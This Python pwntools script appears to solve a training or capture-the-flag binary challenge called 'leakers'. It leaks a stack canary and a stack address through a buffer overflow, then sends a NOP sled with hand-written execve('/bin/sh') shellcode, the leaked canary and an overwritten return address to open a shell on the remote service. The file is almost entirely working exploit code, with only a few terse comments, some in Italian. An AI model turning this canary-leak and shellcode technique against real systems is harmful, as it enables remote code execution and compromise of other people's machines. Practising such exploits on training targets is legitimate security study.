from pwn import *
import time

p = remote("bin.training.offdef.it", 2010)
#p = process("./leakers")


#gdb.attach(p,
#'''
#b *(main+239)
#''')
#input("wait")
p.send(b"B")
p.send(b"A"*105)

p.recvuntil(b"> ")
p.recv(105)
canary = p.recv(7)

p.recv()

#print(canary)

#shellcode = b"A"*104

#indirizzo trovato nello stack - testa buffer
offset = 392

#numero di A per trovare l'indirizzo -> indirizzo che contiene indirizzo - testa buffer
#number_A = 248

p.send(b"B"*152)
p.recvuntil(b"> ")
p.recv(152)
address = p.recv(8)
addr_int = int.from_bytes(address, byteorder='little')

buffer_int = addr_int - offset + 8
buffer = buffer_int.to_bytes(8, byteorder='little')




#shellcode = nops + shellcode_execve
shellcode = b"\x90"*68 + b"\x48\xC7\xC0\x3B\x00\x00\x00\x48\xBF"+ buffer + b"\x48\x83\xC7\x59\x48\x31\xF6\x48\x31\xD2\x0F\x05/bin/sh"
sebp = b"A"*8
p.send(shellcode + b"\x00" + canary + sebp + buffer) 

#p.send(shellcode + b"\x00" + canary + b"B"*400)
time.sleep(0.1)
p.send(b"\n")

p.interactive()